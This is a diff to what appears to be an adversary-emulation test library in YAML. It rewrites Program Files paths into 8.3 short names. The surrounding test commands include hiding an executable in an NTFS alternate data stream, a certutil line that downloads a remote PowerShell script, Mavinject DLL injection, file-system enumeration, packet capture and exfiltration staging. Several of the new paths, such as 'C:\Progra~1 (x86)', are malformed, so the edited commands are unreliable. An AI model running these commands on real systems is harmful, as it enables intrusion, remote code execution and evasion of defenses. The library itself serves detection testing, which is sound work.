@@ -1031,7 +1031,7 @@ persistence:
         target_exenstion_handler:
           description: Thing To Open
           type: Path
-          default: C:\Program Files\Windows Media Player\wmplayer.exe
+          default: C:\Progra~1\Windows Media Player\wmplayer.exe
       executor:
         name: command_prompt
         command: 'cmd.exe /c assoc #{extension_to_change}="#{target_exenstion_handler}"
@@ -7905,7 +7905,7 @@ defense-evasion:
       executor:
         name: command_prompt
         command: |
-          type C:\temp\evil.exe > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"
+          type C:\temp\evil.exe > "C:\Progra~1 (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"
           extrac32 #{path}\procexp.cab #{path}\file.txt:procexp.exe
           findstr /V /L W3AllLov3DonaldTrump #{path}\procexp.exe > #{path}\file.txt:procexp.exe
           certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt
@@ -9034,7 +9034,7 @@ defense-evasion:
         ### Mavinject.exe
         Mavinject.exe is a Windows utility that allows for code execution. Mavinject can be used to input a DLL into a running process. (Citation: Twitter gN3mes1s Status Update MavInject32)
 
-        * <code>"C:\Program Files\Common Files\microsoft shared\ClickToRun\MavInject32.exe" &lt;PID&gt; /INJECTRUNNING &lt;PATH DLL&gt;</code>
+        * <code>"C:\Progra~1\Common Files\microsoft shared\ClickToRun\MavInject32.exe" &lt;PID&gt; /INJECTRUNNING &lt;PATH DLL&gt;</code>
         * <code>C:\Windows\system32\mavinject.exe &lt;PID&gt; /INJECTRUNNING &lt;PATH DLL&gt;</code>
 
         ### SyncAppvPublishingServer.exe
@@ -12431,7 +12431,7 @@ discovery:
         command: |
           dir /s c:\ >> %temp%\download
           dir /s "c:\Documents and Settings" >> %temp%\download
-          dir /s "c:\Program Files\" >> %temp%\download
+          dir /s "C:\Progra~1\" >> %temp%\download
           dir /s d:\ >> %temp%\download
           dir "%systemdrive%\Users\*.*" >> %temp%\download
           dir "%userprofile%\AppData\Roaming\Microsoft\Windows\Recent\*.*" >> %temp%\download
@@ -12773,7 +12773,7 @@ discovery:
       executor:
         name: command_prompt
         command: |
-          c:\Program Files\Wireshark\tshark.exe -i #{interface} -c 5
+          C:\Progra~1\Wireshark\tshark.exe -i #{interface} -c 5
           c:\windump.exe
     - name: Packet Capture PowerShell
       description: |
@@ -12789,7 +12789,7 @@ discovery:
       executor:
         name: powershell
         command: |
-          c:\Program Files\Wireshark\tshark.exe -i #{interface} -c 5
+          C:\Progra~1\Wireshark\tshark.exe -i #{interface} -c 5
           c:\windump.exe
   T1201:
     technique:
@@ -15409,7 +15409,7 @@ credential-access:
       executor:
         name: command_prompt
         command: |
-          c:\Program Files\Wireshark\tshark.exe -i #{interface} -c 5
+          C:\Progra~1\Wireshark\tshark.exe -i #{interface} -c 5
           c:\windump.exe
     - name: Packet Capture PowerShell
       description: |
@@ -15425,7 +15425,7 @@ credential-access:
       executor:
         name: powershell
         command: |
-          c:\Program Files\Wireshark\tshark.exe -i #{interface} -c 5
+          C:\Progra~1\Wireshark\tshark.exe -i #{interface} -c 5
           c:\windump.exe
   T1174:
     technique:
@@ -17511,7 +17511,7 @@ execution:
         ### Mavinject.exe
         Mavinject.exe is a Windows utility that allows for code execution. Mavinject can be used to input a DLL into a running process. (Citation: Twitter gN3mes1s Status Update MavInject32)
 
-        * <code>"C:\Program Files\Common Files\microsoft shared\ClickToRun\MavInject32.exe" &lt;PID&gt; /INJECTRUNNING &lt;PATH DLL&gt;</code>
+        * <code>"C:\Progra~1\Common Files\microsoft shared\ClickToRun\MavInject32.exe" &lt;PID&gt; /INJECTRUNNING &lt;PATH DLL&gt;</code>
         * <code>C:\Windows\system32\mavinject.exe &lt;PID&gt; /INJECTRUNNING &lt;PATH DLL&gt;</code>
 
         ### SyncAppvPublishingServer.exe
@@ -20315,7 +20315,7 @@ exfiltration:
       executor:
         name: command_prompt
         command: |
-          path=%path%;"C:\Program Files (x86)\winzip"
+          path=%path%;"C:\Progra~1 (x86)\winzip"
           mkdir ./tmp/victim-files
           cd ./tmp/victim-files
           echo "This file will be encrypted" > ./encrypted_file.txt
